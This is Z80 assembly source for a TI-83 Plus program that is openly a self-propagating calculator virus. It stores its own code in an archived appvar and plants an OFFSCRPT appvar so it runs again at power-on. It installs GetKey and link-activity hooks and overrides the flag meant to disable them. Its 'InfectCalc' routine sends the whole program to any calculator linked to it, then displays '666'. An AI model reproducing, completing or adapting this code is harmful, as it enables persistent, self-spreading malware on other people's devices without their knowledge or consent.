 DEFINE _SHADYDEBUG_
 globals on

;What flash page to hide the hooks on?
;put them on different pages, Just In Case
HookFlashPage1 	equ 04h
HookFlashPage2 	equ 05h
TempHookAddr	equ 0A570h
UserMemHookAddr	equ 0B810h ;Hope that's safe enough...
UserMemTempCodeRun	equ 0C690h 	;This is where the entire program 
								;will get loaded into ram and sent

linkActivity	equ	42h
 
;macros for ram program
rcall MACRO addr
	;call &addr -ShadyCodeStart+userMem-2
	call &addr
	MACEND
rld MACRO reg, val
	;ld &reg, &val -ShadyCodeStart+userMem-2
	ld &reg, &val
	MACEND

;macros for offscrpt routines
ocall MACRO addr
	call &addr -OffscrptCodeStart+8001h
	MACEND
old MACRO reg, val
		ld &reg, &val -OffscrptCodeStart+8001h
	MACEND

;macros for temphook routines
thcall MACRO addr
	call &addr -TempHookStart+TempHookAddr
	MACEND
thld MACRO reg, val
		ld &reg, &val -TempHookStart+TempHookAddr
	MACEND

 IFDEF _SHADYDEBUG_
	 include "..\..\ti83plus.inc"
	 .org userMem-2
 ENDIF

startofprogramdata:
ramprog:

	db 0BBh, 6dh
	jr StartOfShadyProgram

ShadyCodeStart:
	db t2ByteTok, tasmCmp
	jr StartOfShadyProgram

 StartOfShadyProgram:

ShadyTime:
	rcall CreateShadyOffscrpt
	rcall CreateShadyCodeAppVar
	b_call ClrLCDFull
	ld hl, 123
	b_call DispHL
	ret

 IFDEF _SHADYDEBUG_
 	include "shadyroutines.inc"
 ENDIF

;this creates an appvar that stores the code needed to send itself
CreateShadyCodeAppVar:
	;check to see if the appvar already exists:
	rcall FindShadyCodeAppVar

	;if appvar already exists, don't re-create it
	jr nc, ShadyCodeAppVarExists

	;check to see if we're gonna get a mem error:
	ld hl, ShadyCodeEnd-ShadyCodeStart+1
	b_call EnoughMem
	ret c ;not enough memory... get tha fuck outta here

	;load the hook code into an appvar and archive it
	rld hl, ShadyCodeAppVar
	b_call Mov9ToOP1
	ld hl, ShadyCodeEnd-ShadyCodeStart+1
	b_call CreateAppVar
	inc de
	inc de
	;de=pointer to storage
	rld hl, ShadyCodeStart
	ld bc, ShadyCodeEnd-ShadyCodeStart+1
	ldir ;copies the hook code to the appvar

	;make sure it made the appvar, otherwise bail out
	rcall FindShadyCodeAppVar
	ret  c

ShadyCodeAppVarExists:
	ld a, b
	cp 00h
	ret nz ;if a!=0, it's archived

	rcall FindShadyCodeAppVar
	b_call Arc_Unarc ;archive the sucka
	ret

FindShadyCodeAppVar:
	b_call ZeroOP1
	rld hl, ShadyCodeAppVar
	rst rMOV9TOOP1
	b_call ChkFindSym
	ret

CreateShadyOffscrpt:
	rld hl, OffscrptName
	b_call Mov9ToOP1
	ld hl, OffscrptCodeEnd-OffscrptCodeStart+1
	b_call CreateAppVar
	inc de
	inc de
	;de=pointer to storage
	rld hl, OffscrptCodeStart
	ld bc, OffscrptCodeEnd-OffscrptCodeStart+1
	ldir ;copies the offscrpt code to offscrpt

	set 1, (IY+33h)
	ret

OffscrptName:
	db appvarobj, "OFFSCRPT"

OffscrptCodeStart:
	push af
	push bc
	push de
	push hl
	;ocall InstallInPrograms

	;load temp hook that installs the real hooks
	old hl, TempHookStart
	ld de, TempHookAddr
	ld bc, TempHookEnd-TempHookStart
	ldir
	ld hl, TempHookAddr
	ld a, 1
	b_call EnableGetKeyHook
	
	pop hl
	pop de
	pop bc
	pop af
	ret
TempHookStart:
	db 83h
	push af
	push bc
	push de
	push hl

	;disable this hook
	b_call DisableGetKeyHook
	
	;install real hooks

	;any fools caught activing the override will be shot
	res LinkActivityHookOverride, (iy+LinkActivityHookFlag)
	ld a, 0
	ld (LinkActivityHookPtr+3), a

	;copy hook code into usermem hook space:
	thld hl, HookCodeStart
	ld de, UserMemHookAddr
	ld bc, HookCodeEnd-HookCodeStart+1
	ldir

	ld a, 1
	ld hl, UserMemHookAddr
	b_call EnableLinkActivityHook

	ld de, GetKeyHook-LinkActivityHook
	add hl, de
	
	ld a, 1
	b_call EnableGetKeyHook

	pop hl
	pop de
	pop bc
	pop af
	ret


HookCodeStart:
LinkActivityHook: 
	db 83h
	push af
	;there is hella link activity.
	ld a, linkActivity
	ld (LinkActivityHookPtr+3), a
	pop af
	ret

GetKeyHook:
	db 83h
	push af
	push bc
	push de
	push hl

	;test to see if there's been link activity:
	ld a, (LinkActivityHookPtr+3)
	cp linkActivity
	jr z, InfectCalc
infectcalcdone:
	pop hl
	pop de
	pop bc
	pop af

	;GetKey turns on the linkactivity hook override. This is not acceptable.
	res LinkActivityHookOverride, (iy+LinkActivityHookFlag)

	cp 1Ah ;scanning for keys
	jr nz, oneB
	cp 0
	ret nz
	ld a, 1

oneB:
	ld a, b
	cp 0
	ret nz
	cp 1
	ret

InfectCalc:

	;if the current context is a conflict of variables
	;(e.g. it's asking if you want to overwrite something)
	;then wait to send it.

	;get current context
	ld hl, MenuCurrent
	ld a, (hl)
	cp 00h	;not in a menu, go for it!
	jr nz, infectcalcdone

	ld a, 00h
	ld (LinkActivityHookPtr+3), a

	;load the code from the shadyappvar to a space in usermem, then execute it
	;the code will send the entire program

	include "runinfect.inc"

	b_call ClrLCDFull
	ld hl, 666
	b_call DispHL
	b_call DispDone
	jr infectcalcdone

ShadyCodeAppVar:
	db appvarobj, "SHDYCDE", 00h

HookCodeEnd:

TempHookEnd:
OffscrptCodeEnd:
ShadyCodeEnd:


